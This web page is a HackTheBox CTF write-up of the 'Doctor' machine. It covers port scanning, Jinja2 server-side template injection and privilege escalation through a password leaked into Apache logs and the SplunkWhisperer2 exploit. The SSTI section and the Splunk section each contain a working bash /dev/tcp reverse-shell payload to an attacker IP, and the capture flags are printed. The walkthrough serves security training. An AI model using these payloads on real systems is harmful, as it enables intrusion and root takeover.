<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Doctor | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,easy"><meta name=description content="Doctor HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/doctor/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/doctor/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Doctor "><meta property="og:description" content="Doctor HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/doctor/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/doctor/doctor.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2021-02-15T20:47:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/doctor/doctor.png"><meta name=twitter:title content="Doctor "><meta name=twitter:description content="Doctor HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Doctor ","item":"https://s4ch.github.io/writeups/hackthebox/doctor/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Doctor ","name":"Doctor ","description":"Doctor HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","easy"],"articleBody":"Information Name: Doctor Profile: www.hackthebox.eu Difficulty: Easy OS: Linux Points: 20 Overview Install tools used in this WU on BlackArch Linux:\n$ pacman -S nmap pwncat payloadsallthethings Network enumeration Port and service scan with nmap:\n# Nmap 7.91 scan initiated Sun Feb 14 19:31:04 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.209 Nmap scan report for 10.10.10.209 Host is up (0.056s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA) | 256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA) |_ 256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-methods: |_ Supported Methods: GET HEAD OPTIONS | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-06T15:57:27 | Not valid after: 2023-09-06T15:57:27 | MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787 |_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Feb 14 19:33:51 2021 -- 1 IP address (1 host up) scanned in 166.52 seconds Web discovery Browsing with the IP address we have nothing fancy but we can find a reference to doctors.htb.\n$ curl -s http://10.10.10.209/ | grep doctor info@doctors.htb So lets’ add it to /etc/hosts.\n$ grep doctor /etc/hosts 10.10.10.209 doctors.htb Now browsing http://doctors.htb/ we access an app called Doctor Secure Messaging.\nWe can register an account and login.\nAt http://doctors.htb/post/new there is a feature where we can post a message.\nThere is a HTML comment:\nThe source code of http://doctors.htb/archive is displaying the following XML content:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e ","wordCount":"830","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/doctor/doctor.png","datePublished":"2021-02-15T20:47:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/doctor/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Doctor</h1><div class=post-description>Doctor HackTheBox writeup</div><div class=post-meta><span title='2021-02-15 20:47:00 +0000 UTC'>February 15, 2021</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;830 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/doctor/doctor.png alt="Doctor HackTheBox Machine"><p>Doctor - Easy Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network enumeration</a></li><li><a href=#web-discovery>Web discovery</a></li><li><a href=#web-exploitation-ssti>Web exploitation: SSTI</a></li><li><a href=#privilege-escalation-of-machine--from-web-to-shaun>Privilege Escalation of Machine : from web to shaun</a></li><li><a href=#privilege-escalation-of-machine--from-shaun-to-root>Privilege Escalation of Machine : from shaun to root</a></li></ul></nav></div></details></div><div class=post-content><h1 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h1><ul><li><strong>Name:</strong> Doctor</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/278>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 20</li></ul><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ pacman -S nmap pwncat payloadsallthethings
</code></pre><h2 id=network-enumeration>Network enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h2><p>Port and service scan with nmap:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.91 scan initiated Sun Feb 14 19:31:04 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.209
</span></span><span style=display:flex><span>Nmap scan report for 10.10.10.209
</span></span><span style=display:flex><span>Host is up (0.056s latency).
</span></span><span style=display:flex><span>Not shown: 65532 filtered ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
</span></span><span style=display:flex><span>|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
</span></span><span style=display:flex><span>|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
</span></span><span style=display:flex><span>80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Supported Methods: POST OPTIONS HEAD GET
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
</span></span><span style=display:flex><span>|_http-title: Doctor
</span></span><span style=display:flex><span>8089/tcp open  ssl/http Splunkd httpd
</span></span><span style=display:flex><span>| http-methods:
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD OPTIONS
</span></span><span style=display:flex><span>| http-robots.txt: 1 disallowed entry
</span></span><span style=display:flex><span>|_/
</span></span><span style=display:flex><span>|_http-server-header: Splunkd
</span></span><span style=display:flex><span>|_http-title: splunkd
</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
</span></span><span style=display:flex><span>| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
</span></span><span style=display:flex><span>| Public Key type: rsa
</span></span><span style=display:flex><span>| Public Key bits: 2048
</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style=display:flex><span>| Not valid before: 2020-09-06T15:57:27
</span></span><span style=display:flex><span>| Not valid after:  2023-09-06T15:57:27
</span></span><span style=display:flex><span>| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
</span></span><span style=display:flex><span>|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done at Sun Feb 14 19:33:51 2021 -- 1 IP address (1 host up) scanned in 166.52 seconds
</span></span></code></pre></div><h2 id=web-discovery>Web discovery<a hidden class=anchor aria-hidden=true href=#web-discovery>#</a></h2><p>Browsing with the IP address we have nothing fancy but we can find a reference
to <code>doctors.htb</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ curl -s http://10.10.10.209/ | grep doctor
</span></span><span style=display:flex><span>              &lt;strong&gt;info@doctors.htb&lt;/strong&gt;
</span></span></code></pre></div><p>So lets&rsquo; add it to <code>/etc/hosts</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ grep doctor /etc/hosts
</span></span><span style=display:flex><span>10.10.10.209 doctors.htb
</span></span></code></pre></div><p>Now browsing <a href=http://doctors.htb/>http://doctors.htb/</a> we access an app called <em>Doctor Secure Messaging</em>.</p><p>We can register an account and login.</p><p>At <a href=http://doctors.htb/post/new>http://doctors.htb/post/new</a> there is a feature where we can post a message.</p><p>There is a HTML comment:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#75715e>&lt;!--archive still under beta testing&lt;a class=&#34;nav-item nav-link&#34; href=&#34;/archive&#34;&gt;Archive&lt;/a&gt;--&gt;</span>
</span></span></code></pre></div><p>The source code of <a href=http://doctors.htb/archive>http://doctors.htb/archive</a> is displaying the following XML
content:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>    <span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;rss</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;2.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;channel&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;title&gt;</span>Archive<span style=color:#f92672>&lt;/title&gt;</span>
</span></span></code></pre></div><p>It looks like a RSS feed. If I create a post, an entry appears under the RSS
feed:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>    <span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;rss</span> <span style=color:#a6e22e>version=</span><span style=color:#e6db74>&#34;2.0&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;channel&gt;</span>
</span></span><span style=display:flex><span>     <span style=color:#f92672>&lt;title&gt;</span>Archive<span style=color:#f92672>&lt;/title&gt;</span>
</span></span><span style=display:flex><span>     <span style=color:#f92672>&lt;item&gt;&lt;title&gt;</span>Test title<span style=color:#f92672>&lt;/title&gt;&lt;/item&gt;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;/channel&gt;</span>
</span></span></code></pre></div><h2 id=web-exploitation-ssti>Web exploitation: SSTI<a hidden class=anchor aria-hidden=true href=#web-exploitation-ssti>#</a></h2><p>We can try to inject a <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>SSTI</a>
payload to see if it is executed and reflected.</p><p>As the box is not realistic and most challenge &ldquo;developers&rdquo; only know
python and never try another language so it&rsquo;s almost safe to assume the
web app is coded in python and the template engine will be Jinja2.</p><p>Let&rsquo;s try <code>{{ 7*7 }}</code>, on the RSS feed we can see <code>&lt;item>&lt;title>49&lt;/title>&lt;/item></code>
so we know the payload is executed.</p><p>Let&rsquo;s directly try a simple RCE to get a reverse shell:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>{{config<span style=color:#f92672>.</span>__class__<span style=color:#f92672>.</span><span style=color:#a6e22e>__init__</span><span style=color:#f92672>.</span>__globals__[<span style=color:#e6db74>&#39;os&#39;</span>]<span style=color:#f92672>.</span>popen(<span style=color:#e6db74>&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.169/9999 0&gt;&amp;1&#34;&#39;</span>)<span style=color:#f92672>.</span>read()}}
</span></span></code></pre></div><p>After triggering the RSS feed I received the connection on my listener:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ pwncat -l 9999 -vv
</span></span><span style=display:flex><span>INFO: Listening on :::9999 (family 10/IPv6, TCP)
</span></span><span style=display:flex><span>INFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>INFO: Client connected from 10.10.10.209:50334 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>bash: cannot set terminal process group (864): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>web@doctor:~$
</span></span></code></pre></div><h2 id=privilege-escalation-of-machine--from-web-to-shaun>Privilege Escalation of Machine : from web to shaun<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-web-to-shaun>#</a></h2><p>Interestingly the user we have is in the <code>adm</code> group, this means it can
read <code>/var/log/</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>web@doctor:~$ id
</span></span><span style=display:flex><span>uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
</span></span></code></pre></div><p>Let&rsquo;s check users with a shell to know which user target next:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>web@doctor:~$ grep bash /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>web:x:1001:1001:,,,:/home/web:/bin/bash
</span></span><span style=display:flex><span>shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
</span></span><span style=display:flex><span>splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
</span></span></code></pre></div><p>As we are in <code>adm</code> group I directly targeted <code>/var/log/</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>web@doctor:~$ grep -r password /var/logs
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &#34;POST /reset_password?email=Guitar123&#34; 500 453 &#34;http://doctor.htb/reset_password&#34;
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>Warning: guessing involved here for 2 things:</p><ol><li>the author thinks that it&rsquo;s common for passwords to be accidentally entered into the email field</li><li>find the this password is owned by <code>shaun</code></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>web@doctor:~$ su shaun
</span></span><span style=display:flex><span>Password: Guitar123
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shaun@doctor:/home/web$ cd
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>shaun@doctor:~$ id
</span></span><span style=display:flex><span>uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
</span></span></code></pre></div><h2 id=privilege-escalation-of-machine--from-shaun-to-root>Privilege Escalation of Machine : from shaun to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-shaun-to-root>#</a></h2><p>We have not used Splunk yet, it must be involved in next step.</p><p>A French pentester, <em>Cl├⌐ment Notin</em>, wrote an article entitled
<a href=https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/>Splunk Universal Forwarder Hijacking 2: SplunkWhisperer2</a>
and also made available an associated <a href=https://github.com/cnotin/SplunkWhisperer2>exploit</a>.</p><p>Let&rsquo;s check the prerequisites:</p><ul><li>Universal Forwarder Agents running (on port 8089)</li><li><code>splunkd</code> is running as root</li><li>credentials, guessing again, shaun creds are re-used for the splunk agent (totally realistic)</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ ps -ef f | grep splunk
</span></span><span style=display:flex><span>root        1141       1  0 21:19 ?        Sl     0:01 splunkd -p 8089 start
</span></span><span style=display:flex><span>root        1143    1141  0 21:19 ?        Ss     0:00  \_ [splunkd pid=1141] splunkd -p 8089 start [process-runner]
</span></span></code></pre></div><p>Let&rsquo;s exploit the guesbox now:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ git clone https://github.com/cnotin/SplunkWhisperer2
</span></span><span style=display:flex><span>$ cd SplunkWhisperer2/PySplunkWhispherer2/
</span></span><span style=display:flex><span>$ python PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.169 --username shaun --password Guitar123 --payload &#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.169/8888 0&gt;&amp;1&#34;&#39;
</span></span></code></pre></div><p>Enjoy:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ pwncat -l 8888 -vv
</span></span><span style=display:flex><span>INFO: Listening on 0.0.0.0:8888 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>INFO: Client connected from 10.10.10.209:35294 (family 2/IPv4, TCP)
</span></span><span style=display:flex><span>bash: cannot set terminal process group (1143): Inappropriate ioctl for device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>root@doctor:/# id
</span></span><span style=display:flex><span>uid=0(root) gid=0(root) groups=0(root)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@doctor:/# cat /root/root.txt
</span></span><span style=display:flex><span>2011c879032a897c9d4d517f7e448839
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>root@doctor:/# cat /home/shaun/user.txt
</span></span><span style=display:flex><span>95cb0c0321ccb5c5cc4d617b2c4cb2bf
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul><nav class=paginav><a class=prev href=https://s4ch.github.io/writeups/hackthebox/jewel/><span class=title>« Prev</span><br><span>Jewel </span></a><a class=next href=https://s4ch.github.io/writeups/hackthebox/omni/><span class=title>Next »</span><br><span>Omni</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>